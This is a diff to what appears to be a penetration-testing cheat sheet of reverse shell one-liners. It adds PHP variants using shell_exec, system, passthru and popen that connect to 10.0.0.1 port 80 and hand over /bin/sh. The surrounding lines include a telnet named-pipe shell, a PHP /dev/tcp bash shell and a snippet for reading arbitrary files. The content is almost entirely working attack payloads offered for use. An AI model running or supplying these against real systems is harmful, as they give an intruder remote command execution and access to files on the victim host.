@@ -44,12 +44,16 @@ rm -f /tmp/p; mknod /tmp/p p && telnet IP PORT 0/tmp/p
 
 ## PHP
 
-[sushant747.gitbooks.io/bypass_image_upload.html](https://sushant747.gitbooks.io/total-oscp-guide/content/bypass_image_upload.html)
+[sushant747.gitbooks.io/bypass\_image\_upload.html](https://sushant747.gitbooks.io/total-oscp-guide/content/bypass\_image\_upload.html)
 
 ```bash
 # one liner
 php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
 php -r '$sock=fsockopen("IP",PORT);exec("/bin/bash -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.0.0.1",80);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.0.0.1",80);system("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.0.0.1",80);passthru("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.0.0.1",80);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
 var = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/IP/PORT 0>&1\'"); ?>';
 
 <?php echo file_get_contents('FILE_TO_READ'); ?> 
